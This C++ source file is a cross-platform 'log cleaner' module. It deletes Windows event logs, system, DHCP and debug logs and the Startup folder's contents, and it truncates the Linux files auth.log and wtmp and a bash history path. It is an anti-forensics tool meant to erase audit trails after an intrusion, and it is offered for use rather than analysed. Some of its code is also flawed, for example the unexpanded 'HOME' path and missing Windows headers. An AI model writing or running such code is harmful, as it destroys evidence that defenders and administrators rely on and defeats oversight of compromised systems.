// === LOG CLEANER (Windows & Linux) ===
// This program erases / deletes the files at the common log
// locations. Works for both Windows and Linux.

#include <array>
#include <filesystem>
#include <iostream>
#include <system_error>
#include <unistd.h>

class LogCleanupModule {
    private:
    std::array<std::filesystem::path, 6> windowsLogLocations = {
        "C:\\Windows\\System32\\LogFiles\\",
        "C:\\Windows\\System32\\winevt\\Logs\\",
        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
        "C:\\Windows\\Debug\\",
        "C:\\Windows\\System32\\dhcp\\",
        "C:\\ProgramData\\Logs\\"
    };

    std::array<const char*, 3> linuxLogLocations = {
        "HOME/.bash_history",
        "/var/log/auth.log",
        "/var/log/wtmp"
    };

    void eraseLinuxLogs() {
        for (const char* path : linuxLogLocations) {
            truncate(path, 0);
        }
    }

    void eraseWindowsLogs() {
        for (const std::filesystem::path& path : windowsLogLocations) {
            std::error_code errorCode;

            if (!std::filesystem::exists(path, errorCode)) {
                std::cout << "Skipping missing folder: " << path << std::endl;
                continue;
            }
            if (!std::filesystem::is_directory(path, errorCode)) {
                std::cout << "Skipping non-directory: " << path << std::endl;
                continue;
            }

            for (const std::filesystem::directory_entry& entry :
                std::filesystem::directory_iterator(path, std::filesystem::directory_options::none, errorCode)) {
                    if (errorCode) {
                        std::cout << "Cannot read folder: " << path << " -- Error: " << errorCode.message() << std::endl;
                        errorCode.clear();
                        break;
                    }

                    const std::filesystem::path& filePath = entry.path();

                    if (!entry.is_regular_file(errorCode)) {
                        errorCode.clear();
                        continue;
                    }

                    // Remove read-only attribute:
                    std::filesystem::permissions(filePath, std::filesystem::perms::owner_write, std::filesystem::perm_options::add, errorCode);

                    bool deleted = std::filesystem::remove(filePath, errorCode);

                    if (deleted) {
                        std::cout << "Deleted: " << filePath << std::endl;
                    } else {
                        std::cout << "Unable to delete: " << filePath << " -- Reason: " << errorCode.message() << std::endl;                        
                       
                        // Delayed delete.
                        // TODO: Find out if Linux has equivalent:
                        #ifdef _WIN32
                        std::cout << "If possible, setting for deletion upon reboot." << std::endl;
                        
                        bool delayedDelete = MoveFileExA(filePath.string().c_str(), nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
                        if (!delayedDelete) {
                            std::cerr << "Failed to set for delayed deletion: " << filePath << std::endl;
                        } 
                        #endif                       
                    }
            }
        }
    }

    public:
    LogCleanupModule() {}
    ~LogCleanupModule() {}    

    void initialize() {
        #ifdef _WIN32
        std::cout << "-- -- Cleaning logs (Windows)..." << std::endl;
        eraseWindowsLogs();

        #else
        std::cout << "-- -- Cleaning logs (Linux)..." << std::endl;
        eraseLinuxLogs();    

        #endif
    }
};

int main() {

    LogCleanupModule logCleanup;
    logCleanup.initialize();

    return 0;
}
